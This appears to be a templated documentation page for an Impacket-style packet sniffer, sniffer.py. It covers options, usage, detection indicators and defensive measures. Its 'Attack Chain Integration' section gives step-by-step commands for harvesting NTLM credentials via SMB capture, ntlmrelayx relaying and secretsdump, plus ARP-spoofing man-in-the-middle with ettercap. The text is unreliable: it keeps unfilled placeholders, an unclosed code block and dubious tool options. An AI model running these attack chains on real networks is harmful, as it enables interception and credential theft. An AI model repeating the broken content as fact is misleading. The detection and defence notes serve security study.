## Command Line Options

```
usage: sniffer.py [-h] [options] target

Required Arguments:
  target                [Description of target parameter]

Optional Arguments:
  -h, --help            Show help message
  [Add specific options based on tool functionality]

Authentication:
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password
  -k                    Use Kerberos authentication
  -aesKey               AES key for Kerberos authentication
  -dc-ip                Domain controller IP address
```

## Usage Examples

### Basic Usage
```bash
# Basic command execution
python3 sniffer.py [basic_parameters]

# With authentication
python3 sniffer.py domain.com/user:password@target.domain.com

# Using hash authentication
python3 sniffer.py -hashes :ntlmhash domain.com/user@target.domain.com
```

### Advanced Usage
```bash
# Capture specific protocols with custom filters
python3 sniffer.py eth0 -filter "tcp port 445 or tcp port 139"

# Long-term monitoring with output rotation
python3 sniffer.py eth0 -output capture_%Y%m%d_%H%M%S.pcap -rotate-size 100MB

# Remote packet capture via SMB
python3 sniffer.py -remote domain.com/user:password@192.168.1.100
```

## Attack Chain Integration

### Network-based Credential Harvesting
```bash
# Step 1: Position sniffer on network segment
python3 sniffer.py eth0 -filter "port 445 or port 139" -output creds.pcap

# Step 2: Force authentication attempts
python3 ntlmrelayx.py -t smb://target -smb2support

# Step 3: Extract credentials from captured traffic
python3 secretsdump.py -pcap creds.pcap
```

### Man-in-the-Middle Attack Support
```bash
# Step 1: Set up packet capture
python3 sniffer.py eth0 -filter "host 192.168.1.100" -output mitm.pcap

# Step 2: Perform ARP spoofing (separate terminal)
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

## Prerequisites
- Root/Administrator privileges for packet capture
- Python 3.x with Impacket and pcapy libraries installed
- Network interface access (promiscuous mode capability)
- Sufficient storage space for captured data

## Detection Considerations
- **Event IDs**: 
  - No Windows Event IDs (runs on analyst system)
- **Network Indicators**: 
  - Network interface in promiscuous mode
  - High network traffic processing
  - Unusual packet capture processes
- **Process Indicators**: 
  - Python processes with elevated privileges
  - High CPU usage during packet processing
- **File Indicators**: 
  - Large data files being created
  - Network capture temporary files
- **Registry Indicators**: 
  - No registry modifications

## Defensive Measures
- Monitor for network interfaces entering promiscuous mode
- Implement network access control (NAC) solutions
- Use encrypted protocols (TLS/SSL) to protect data
- Deploy network intrusion detection systems (NIDS)
- Regular monitoring of privileged user activities
- Network segmentation to limit packet visibility

## Common Issues and Troubleshooting

### Permission Denied for Packet Capture
```bash
# Problem: Insufficient privileges to capture packets
# Solution: Run with elevated privileges
sudo python3 sniffer.py
```

### Interface Selection Problems
```bash
# Problem: Cannot find appropriate network interface
# Solution: List available interfaces and select manually
ip link show  # List network interfaces
```
